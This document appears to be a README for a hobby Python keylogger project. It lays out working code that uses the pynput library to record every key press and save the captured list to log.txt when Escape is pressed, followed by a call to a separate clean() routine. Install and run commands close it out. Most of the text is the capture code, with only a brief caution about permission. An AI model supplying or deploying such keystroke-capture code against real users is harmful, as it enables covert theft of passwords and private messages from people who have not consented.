Keylogger Project Readme
Overview
This Python script serves as a basic keylogger, capturing key presses and saving them to a log file named 'log.txt'. The code utilizes the pynput library to monitor and record keyboard input. Additionally, there is a function clean() from a module KLcleaner (presumably related to cleaning up after the keylogging process).

Dependencies
pynput: This library is used for monitoring keyboard input.

How it Works
The script imports necessary modules, including pynput.keyboard for keyboard monitoring, and the custom KLcleaner module for cleaning.
python

Copy code
from pynput.keyboard import Key, Listener
from KLcleaner import clean
The script initializes an empty list called keys to store the pressed keys.
python
Copy code
keys = []
Two functions, on_press and on_release, are defined to handle key events. The on_press function appends each pressed key to the keys list, and the on_release function checks if the pressed key is the escape key (Key.esc). If the escape key is pressed, the script writes the collected keys to the 'log.txt' file and terminates the keylogging process.
python
Copy code
def on_press(key):
    keys.append(key)

def on_release(key):
    if key == Key.esc:
        with open('log.txt', 'w') as file:
            file.writelines(str(keys))
        return False
The script initializes a Listener object with the defined on_press and on_release functions, and starts monitoring the keyboard.
python
Copy code
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
After the listener is terminated (when the escape key is pressed), the clean() function is called, presumably to perform cleanup operations.
python
Copy code
clean()
Important Notes
This script has the potential to be misused for unauthorized access to sensitive information. Always use such scripts responsibly and only on systems for which you have explicit permission.
Keyloggers are often associated with malicious activities, so be cautious when working on or using such scripts.
Usage
Install the required dependencies:
bash
Copy code
pip install pynput
Run the script:
bash
Copy code
python keylogger.py
Press the escape key to stop the keylogging process.
